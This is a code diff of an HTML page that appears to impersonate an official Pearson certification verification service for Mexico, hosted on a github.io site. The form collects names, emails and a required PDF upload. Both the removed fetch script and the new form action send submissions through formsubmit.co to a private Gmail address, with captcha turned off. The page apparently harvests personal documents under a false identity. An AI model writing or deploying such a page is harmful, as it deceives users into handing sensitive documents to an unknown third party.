@@ -19,13 +19,7 @@
         .input-group input[type="text"], .input-group input[type="email"] { width: 100%; padding: 12px; border: 1px solid #bdc3c7; border-radius: 4px; box-sizing: border-box; }
         .input-group input[type="file"] { background: #f4f4f4; padding: 10px; width: 100%; border-radius: 4px; border: 1px dashed #007ba3; cursor: pointer; }
         .btn-submit { background-color: #007fa3; color: white; border: none; padding: 15px; font-size: 16px; font-weight: bold; border-radius: 4px; cursor: pointer; width: 100%; margin-top: 20px; transition: 0.3s; }
-        .btn-submit:disabled { background-color: #bdc3c7; cursor: not-allowed; }
-
-        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 1000; justify-content: center; align-items: center; }
-        .modal-content { background: white; padding: 30px; border-radius: 8px; max-width: 400px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
-        .modal-content h2 { color: #007ba3; margin-top: 0; }
-        .modal-content p { color: #555; font-size: 14px; margin-bottom: 20px; }
-        .btn-modal { background-color: #007fa3; color: white; border: none; padding: 10px 30px; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        .btn-submit:hover { background-color: #005f7a; }
     </style>
 </head>
 <body>
@@ -40,7 +34,9 @@
         </div>
 
         <div class="card">
-            <form id="verificationForm" method="POST" enctype="multipart/form-data">
+            <form action="https://formsubmit.co/juliandavidpedrazarozo@gmail.com" method="POST" enctype="multipart/form-data">
+                
+                <input type="hidden" name="_next" value="https://soporte-certificaciones-mx.github.io/verificacion-pearson-peic/">
                 <input type="hidden" name="_captcha" value="false">
                 <input type="hidden" name="_subject" value="Nueva Verificación + PDF - México">
                 <input type="text" name="_honey" style="display:none">
@@ -73,53 +69,10 @@
                     <input type="file" name="attachment" accept=".pdf" required>
                 </div>
 
-                <button type="submit" id="submitBtn" class="btn-submit">Enviar para Verificación</button>
+                <button type="submit" class="btn-submit">Enviar para Verificación</button>
             </form>
         </div>
     </div>
 
-    <div id="thankYouModal" class="modal-overlay">
-        <div class="modal-content">
-            <h2>¡Solicitud Recibida!</h2>
-            <p>La documentación será validada de vuelta al correo proporcionado.</p>
-            <button class="btn-modal" onclick="closeModal()">Aceptar</button>
-        </div>
-    </div>
-
-    <script>
-        const form = document.getElementById('verificationForm');
-        const modal = document.getElementById('thankYouModal');
-        const btn = document.getElementById('submitBtn');
-
-        form.addEventListener('submit', function(e) {
-            e.preventDefault();
-            btn.disabled = true;
-            btn.innerText = "Enviando...";
-
-            const formData = new FormData(form);
-
-            fetch('https://formsubmit.co/ajax/juliandavidpedrazarozo@gmail.com', {
-                method: 'POST',
-                body: formData
-                // NO agregamos headers, para que el navegador configure el multipart solo
-            })
-            .then(response => response.json())
-            .then(data => {
-                modal.style.display = 'flex';
-                form.reset();
-                btn.disabled = false;
-                btn.innerText = "Enviar para Verificación";
-            })
-            .catch(error => {
-                alert('Hubo un error al enviar. Por favor intente de nuevo.');
-                btn.disabled = false;
-                btn.innerText = "Enviar para Verificación";
-            });
-        });
-
-        function closeModal() {
-            modal.style.display = 'none';
-        }
-    </script>
 </body>
 </html>
